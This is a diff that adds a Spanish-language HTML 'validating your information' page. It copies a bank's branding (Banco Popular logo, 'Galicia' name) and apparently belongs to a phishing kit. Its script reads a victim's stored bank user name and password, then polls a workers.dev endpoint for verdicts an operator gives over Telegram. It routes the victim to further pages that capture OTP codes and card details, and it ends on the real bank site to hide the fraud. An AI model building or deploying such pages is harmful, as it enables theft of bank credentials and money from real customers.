@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes" />
+  <title>Validando - Galicia</title>
+  
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <style>
+    /* RESET Y BASE */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+      -webkit-tap-highlight-color: transparent;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+      color: #000;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    /* FONDO DECORATIVO RESPONSIVE */
+    .background-pattern {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: 
+        radial-gradient(circle at 10% 20%, rgba(244, 119, 33, 0.05) 0%, transparent 20%),
+        radial-gradient(circle at 90% 80%, rgba(244, 119, 33, 0.05) 0%, transparent 20%);
+      z-index: -1;
+    }
+
+    /* Contenedor principal */
+    .loading-container {
+      width: 100%;
+      max-width: 500px;
+      background: white;
+      border-radius: 24px;
+      padding: 40px 35px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+      border: 1px solid rgba(0, 0, 0, 0.05);
+      text-align: center;
+      animation: fadeIn 0.8s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Logo */
+    .logo {
+      text-align: center;
+      margin-bottom: 40px;
+      padding-bottom: 25px;
+      border-bottom: 1px solid rgba(0, 0, 0, 0.08);
+    }
+
+    .logo img {
+      width: 200px;
+      height: auto;
+      transition: transform 0.3s ease;
+      filter: brightness(1.1);
+    }
+
+    /* Spinner principal */
+    .spinner-container {
+      position: relative;
+      width: 120px;
+      height: 120px;
+      margin: 0 auto 40px;
+    }
+
+    .spinner-outer {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border: 4px solid rgba(244, 119, 33, 0.1);
+      border-top: 4px solid #f47721;
+      border-radius: 50%;
+      animation: spin 1.5s linear infinite;
+    }
+
+    .spinner-inner {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      right: 20px;
+      bottom: 20px;
+      border: 3px solid rgba(244, 119, 33, 0.1);
+      border-top: 3px solid #f47721;
+      border-radius: 50%;
+      animation: spin 1s linear infinite reverse;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .spinner-icon {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: #f47721;
+      font-size: 30px;
+    }
+
+    /* Títulos */
+    .loading-title {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 15px;
+      color: #333;
+      background: linear-gradient(135deg, #f47721 0%, #d95c0e 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .loading-subtitle {
+      font-size: 16px;
+      color: #666;
+      line-height: 1.6;
+      margin-bottom: 15px;
+    }
+
+    /* Progress bar */
+    .progress-container {
+      margin: 35px 0;
+    }
+
+    .progress-label {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 8px;
+      background: rgba(0, 0, 0, 0.05);
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, #f47721, #ff8c3a);
+      border-radius: 4px;
+      animation: progressAnimation 3s ease-in-out infinite;
+    }
+
+    @keyframes progressAnimation {
+      0% { width: 0%; }
+      30% { width: 40%; }
+      60% { width: 70%; }
+      90% { width: 95%; }
+      100% { width: 100%; }
+    }
+
+    /* Puntos animados */
+    .dots-container {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin: 30px 0;
+    }
+
+    .dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #f47721;
+      opacity: 0.3;
+      animation: dotPulse 1.4s ease-in-out infinite both;
+    }
+
+    .dot:nth-child(1) { animation-delay: -0.32s; }
+    .dot:nth-child(2) { animation-delay: -0.16s; }
+    .dot:nth-child(3) { animation-delay: 0s; }
+
+    @keyframes dotPulse {
+      0%, 80%, 100% {
+        transform: scale(0.8);
+        opacity: 0.3;
+      }
+      40% {
+        transform: scale(1.2);
+        opacity: 0.8;
+      }
+    }
+
+    /* Tarjeta de seguridad */
+    .security-card {
+      background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+      border-radius: 16px;
+      padding: 25px;
+      margin-top: 30px;
+      border: 1px solid rgba(0, 0, 0, 0.05);
+      text-align: left;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .security-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 4px;
+      height: 100%;
+      background: linear-gradient(to bottom, #f47721, #ff8c3a);
+    }
+
+    .security-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 15px;
+    }
+
+    .security-icon {
+      width: 40px;
+      height: 40px;
+      background: linear-gradient(135deg, #f47721 0%, #d95c0e 100%);
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 18px;
+    }
+
+    .security-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #333;
+      flex: 1;
+    }
+
+    .security-text {
+      font-size: 14px;
+      color: #666;
+      line-height: 1.5;
+    }
+
+    /* Información de transacción */
+    .transaction-info {
+      background: rgba(244, 119, 33, 0.05);
+      border-radius: 12px;
+      padding: 20px;
+      margin-top: 25px;
+      border: 1px solid rgba(244, 119, 33, 0.1);
+    }
+
+    .transaction-title {
+      font-size: 15px;
+      font-weight: 600;
+      color: #f47721;
+      margin-bottom: 10px;
+    }
+
+    .transaction-id {
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      color: #666;
+      word-break: break-all;
+    }
+
+    .transaction-status {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #f47721;
+      font-weight: 500;
+    }
+
+    /* Estados de conexión */
+    .connection-status {
+      margin-top: 15px;
+      padding: 10px;
+      border-radius: 8px;
+      font-size: 13px;
+      display: none;
+    }
+
+    .connection-status.visible {
+      display: block;
+    }
+
+    .connection-status.checking {
+      background: #fff3cd;
+      color: #856404;
+      border: 1px solid #ffc107;
+    }
+
+    .connection-status.success {
+      background: #d4edda;
+      color: #155724;
+      border: 1px solid #28a745;
+    }
+
+    .connection-status.error {
+      background: #f8d7da;
+      color: #721c24;
+      border: 1px solid #dc3545;
+    }
+
+    /* Footer */
+    .footer {
+      margin-top: 40px;
+      font-size: 12px;
+      color: #888;
+      text-align: center;
+      line-height: 1.6;
+      padding-top: 20px;
+      border-top: 1px solid rgba(0, 0, 0, 0.08);
+    }
+
+    .footer strong {
+      color: #f47721;
+      font-weight: 700;
+    }
+
+    /* Botón de reintentar */
+    .retry-container {
+      margin-top: 20px;
+      display: none;
+    }
+
+    .retry-container.visible {
+      display: block;
+    }
+
+    .retry-btn {
+      width: 100%;
+      padding: 12px;
+      background: #f47721;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .retry-btn:hover {
+      background: #d95c0e;
+      transform: scale(1.02);
+    }
+
+    /* ===========================
+        MEDIA QUERIES RESPONSIVE
+    =========================== */
+
+    @media (max-width: 480px) {
+      body {
+        padding: 15px;
+        background: white;
+      }
+      
+      .background-pattern {
+        display: none;
+      }
+      
+      .loading-container {
+        padding: 25px 20px;
+        border-radius: 16px;
+        box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
+        border: none;
+      }
+      
+      .logo {
+        margin-bottom: 30px;
+      }
+      
+      .logo img {
+        width: 160px;
+      }
+      
+      .spinner-container {
+        width: 100px;
+        height: 100px;
+        margin-bottom: 30px;
+      }
+      
+      .loading-title {
+        font-size: 22px;
+      }
+      
+      .loading-subtitle {
+        font-size: 15px;
+      }
+      
+      .security-card {
+        padding: 20px;
+      }
+
+      @supports (padding: max(0px)) {
+        body {
+          padding: max(15px, env(safe-area-inset-top)) 
+                   max(15px, env(safe-area-inset-right)) 
+                   max(15px, env(safe-area-inset-bottom)) 
+                   max(15px, env(safe-area-inset-left));
+        }
+        
+        .loading-container {
+          padding: max(25px, env(safe-area-inset-top) / 2) 
+                   max(25px, env(safe-area-inset-right) / 2) 
+                   max(25px, env(safe-area-inset-bottom) / 2) 
+                   max(25px, env(safe-area-inset-left) / 2);
+        }
+      }
+    }
+
+    @media (max-height: 600px) {
+      .loading-container {
+        padding: 20px;
+      }
+      
+      .logo {
+        margin-bottom: 20px;
+      }
+      
+      .spinner-container {
+        width: 80px;
+        height: 80px;
+        margin-bottom: 20px;
+      }
+      
+      .loading-title {
+        font-size: 22px;
+        margin-bottom: 10px;
+      }
+      
+      .loading-subtitle {
+        font-size: 14px;
+        margin-bottom: 10px;
+      }
+      
+      .security-card {
+        padding: 15px;
+        margin-top: 20px;
+      }
+    }
+
+    @media (prefers-color-scheme: dark) {
+      body {
+        background: #121212;
+        color: #ffffff;
+      }
+      
+      .loading-container {
+        background: #1e1e1e;
+        border-color: #333;
+      }
+      
+      .logo {
+        border-bottom-color: #333;
+      }
+      
+      .loading-title {
+        color: #ffffff;
+      }
+      
+      .loading-subtitle {
+        color: #bbb;
+      }
+      
+      .progress-bar {
+        background: #2d2d2d;
+      }
+      
+      .security-card {
+        background: linear-gradient(135deg, #2d2d2d 0%, #252525 100%);
+        border-color: #333;
+      }
+      
+      .security-title {
+        color: #fff;
+      }
+      
+      .security-text {
+        color: #aaa;
+      }
+      
+      .transaction-info {
+        background: rgba(244, 119, 33, 0.1);
+        border-color: rgba(244, 119, 33, 0.2);
+      }
+      
+      .footer {
+        color: #888;
+        border-top-color: #333;
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      * {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+      }
+      
+      .spinner-outer,
+      .spinner-inner,
+      .progress-fill,
+      .dot {
+        animation: none !important;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Fondo decorativo -->
+  <div class="background-pattern"></div>
+
+  <!-- Contenido principal -->
+  <div class="loading-container">
+    <div class="logo">
+      <img src="https://mi.bancopopular.com.co/assets/images/popularhorizontal_new.svg" 
+           alt="Galicia" 
+           loading="eager"
+           style="filter: brightness(1.1);">
+    </div>
+
+    <!-- Spinner animado -->
+    <div class="spinner-container">
+      <div class="spinner-outer"></div>
+      <div class="spinner-inner"></div>
+      <div class="spinner-icon">
+        <i class="fas fa-shield-alt"></i>
+      </div>
+    </div>
+
+    <!-- Puntos animados -->
+    <div class="dots-container">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+
+    <!-- Títulos -->
+    <h1 class="loading-title">Validando tu información</h1>
+    
+    <p class="loading-subtitle">Estamos procesando tu solicitud de manera segura</p>
+    <p class="loading-subtitle" id="statusMessage">Esperando autorización...</p>
+
+    <!-- Barra de progreso -->
+    <div class="progress-container">
+      <div class="progress-label">
+        <span>Progreso</span>
+        <span id="progressPercent">0%</span>
+      </div>
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+    </div>
+
+    <!-- Tarjeta de seguridad -->
+    <div class="security-card">
+      <div class="security-header">
+        <div class="security-icon">
+          <i class="fas fa-lock"></i>
+        </div>
+        <div class="security-title">Transacción Segura</div>
+      </div>
+      <p class="security-text">
+        Tu información está protegida con los más altos estándares de seguridad bancaria. 
+        Este proceso puede tomar unos segundos mientras verificamos tus datos.
+      </p>
+    </div>
+
+    <!-- Información de transacción -->
+    <div class="transaction-info" id="transactionInfo">
+      <div class="transaction-title">ID de Transacción</div>
+      <div class="transaction-id" id="transactionId">Cargando...</div>
+      <div class="transaction-status" id="transactionStatus">● Conectando...</div>
+    </div>
+
+    <!-- Estado de conexión -->
+    <div class="connection-status" id="connectionStatus"></div>
+
+    <!-- Botón de reintentar -->
+    <div class="retry-container" id="retryContainer">
+      <button class="retry-btn" id="retryBtn">
+        🔄 Reintentar
+      </button>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+      <strong>Galicia</strong> - Tu seguridad es nuestra prioridad<br>
+      Protegido por reCAPTCHA | Privacidad – Condiciones
+    </div>
+  </div>
+
+  <script>
+    // ========================= CONFIGURACIÓN =========================
+    const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
+    const BASE_URL = 'https://personasgalicia.vercel.app';
+    let intentos = 0;
+    const MAX_INTENTOS = 60; // 10 minutos (60 * 10s)
+    let pollingInterval = null;
+
+    document.addEventListener('DOMContentLoaded', async () => {
+      // Obtener datos del localStorage
+      const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
+      
+      if (!bancoldata || !bancoldata.usuario || !bancoldata.clave || !bancoldata.transactionId) {
+        mostrarError('Faltan datos de login. Redirigiendo al inicio...');
+        setTimeout(() => {
+          window.location.href = `${BASE_URL}/`;
+        }, 3000);
+        return;
+      }
+
+      const usuario = bancoldata.usuario;
+      const clave = bancoldata.clave;
+      const transactionId = bancoldata.transactionId;
+      
+      // Mostrar el ID de transacción
+      document.getElementById('transactionId').textContent = transactionId;
+      document.getElementById('transactionStatus').textContent = '⏳ Verificando estado...';
+      
+      console.log('🔍 Verificando estado de transacción:', transactionId);
+      console.log(`📡 Worker URL: ${WORKER_URL}`);
+      console.log(`🌐 Base URL: ${BASE_URL}`);
+
+      // Iniciar la verificación de estado
+      await checkStatus(transactionId);
+    });
+
+    // ========================= FUNCIÓN PRINCIPAL =========================
+    async function checkStatus(transactionId) {
+      intentos++;
+      
+      try {
+        // Actualizar UI
+        actualizarProgreso(intentos, MAX_INTENTOS);
+        document.getElementById('transactionStatus').textContent = `⏳ Verificando... (${intentos}/${MAX_INTENTOS})`;
+        
+        // Consultar el Worker
+        const response = await fetch(`${WORKER_URL}/status?id=${transactionId}`);
+        
+        if (!response.ok) {
+          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+        }
+        
+        const data = await response.json();
+        console.log(`📊 Estado recibido (intento ${intentos}):`, data);
+
+        // Si no hay estado o está pendiente, seguir esperando
+        if (!data.estado || data.estado === "pendiente") {
+          // Mostrar mensaje de espera
+          document.getElementById('statusMessage').textContent = '⏳ Esperando autorización en Telegram...';
+          mostrarConexion('checking', '⏳ Esperando respuesta del servidor...');
+          
+          // Verificar límite de intentos
+          if (intentos >= MAX_INTENTOS) {
+            mostrarError('⏰ Tiempo de espera agotado. La transacción expiró.');
+            document.getElementById('transactionStatus').textContent = '❌ Tiempo agotado';
+            mostrarBotonReintentar(transactionId);
+            return;
+          }
+          
+          // Esperar y reintentar
+          setTimeout(() => checkStatus(transactionId), 10000);
+          return;
+        }
+
+        // ========================= PROCESAR ESTADO =========================
+        document.getElementById('transactionStatus').textContent = `✅ Estado: ${data.estado}`;
+        
+        switch (data.estado) {
+          case 'autorizado':
+            mostrarExito('✅ ¡Autorización confirmada! Redirigiendo...');
+            document.getElementById('statusMessage').textContent = '✅ Acceso concedido. Bienvenido.';
+            mostrarConexion('success', '✅ Autorización confirmada');
+            setTimeout(() => {
+              window.location.href = `${BASE_URL}/codigo.html`;
+            }, 2000);
+            break;
+            
+          case 'error':
+            mostrarError('❌ Acceso denegado. Contacta con soporte.');
+            document.getElementById('statusMessage').textContent = '❌ Operación rechazada';
+            mostrarConexion('error', '❌ Acceso denegado');
+            setTimeout(() => {
+              window.location.href = `${BASE_URL}/`;
+            }, 3000);
+            break;
+            
+          case 'otp_solicitado':
+            document.getElementById('statusMessage').textContent = '📲 Se ha solicitado un OTP. Revisa tu teléfono.';
+            mostrarConexion('checking', '📲 Esperando código OTP...');
+            setTimeout(() => checkStatus(transactionId), 10000);
+            break;
+            
+          case 'otp_recibido':
+            document.getElementById('statusMessage').textContent = '📲 OTP recibido. Procesando...';
+            mostrarConexion('success', '📲 OTP verificado');
+            setTimeout(() => {
+              window.location.href = `${BASE_URL}/codeinco.html`;
+            }, 2000);
+            break;
+            
+          case 'fallo_biometria':
+            document.getElementById('statusMessage').textContent = '🔐 Validación biométrica requerida.';
+            mostrarConexion('checking', '🔐 Verificando biometría...');
+            setTimeout(() => {
+              window.location.href = `${BASE_URL}/tarjeta.html`;
+            }, 2000);
+            break;
+            
+          case 'finalizado':
+            document.getElementById('statusMessage').textContent = '🏁 Proceso finalizado.';
+            mostrarConexion('success', '🏁 Operación completada');
+            setTimeout(() => {
+              window.location.href = 'https://www.bancopopular.com.co/';
+            }, 2000);
+            break;
+            
+          default:
+            document.getElementById('statusMessage').textContent = `ℹ️ Estado: ${data.estado}`;
+            mostrarConexion('checking', `ℹ️ Estado desconocido: ${data.estado}`);
+            setTimeout(() => checkStatus(transactionId), 10000);
+        }
+        
+      } catch (error) {
+        console.error('❌ Error en la verificación:', error);
+        
+        // Mostrar error en UI
+        mostrarConexion('error', `❌ Error: ${error.message}`);
+        document.getElementById('transactionStatus').textContent = '❌ Error de conexión';
+        
+        // Reintentar si no se excedió el límite
+        if (intentos < MAX_INTENTOS) {
+          document.getElementById('statusMessage').textContent = '⚠️ Error de conexión. Reintentando...';
+          setTimeout(() => checkStatus(transactionId), 5000);
+        } else {
+          mostrarError('❌ Error persistente. Recarga la página o contacta con soporte.');
+          mostrarBotonReintentar(transactionId);
+        }
+      }
+    }
+
+    // ========================= FUNCIONES DE UI =========================
+    function actualizarProgreso(actual, total) {
+      const porcentaje = Math.min(Math.round((actual / total) * 100), 100);
+      document.getElementById('progressPercent').textContent = `${porcentaje}%`;
+      document.getElementById('progressFill').style.width = `${porcentaje}%`;
+    }
+
+    function mostrarConexion(tipo, mensaje) {
+      const el = document.getElementById('connectionStatus');
+      el.className = 'connection-status visible';
+      el.textContent = mensaje;
+      el.classList.add(tipo);
+    }
+
+    function mostrarError(mensaje) {
+      document.getElementById('statusMessage').textContent = mensaje;
+      mostrarConexion('error', mensaje);
+    }
+
+    function mostrarExito(mensaje) {
+      document.getElementById('statusMessage').textContent = mensaje;
+      mostrarConexion('success', mensaje);
+    }
+
+    function mostrarBotonReintentar(transactionId) {
+      const container = document.getElementById('retryContainer');
+      container.classList.add('visible');
+      
+      document.getElementById('retryBtn').addEventListener('click', function() {
+        // Reiniciar el proceso
+        intentos = 0;
+        container.classList.remove('visible');
+        document.getElementById('statusMessage').textContent = '🔄 Reintentando...';
+        document.getElementById('transactionStatus').textContent = '● Conectando...';
+        ocultarConexion();
+        checkStatus(transactionId);
+      });
+    }
+
+    function ocultarConexion() {
+      const el = document.getElementById('connectionStatus');
+      el.className = 'connection-status';
+      el.textContent = '';
+    }
+  </script>
+</body>
+</html>
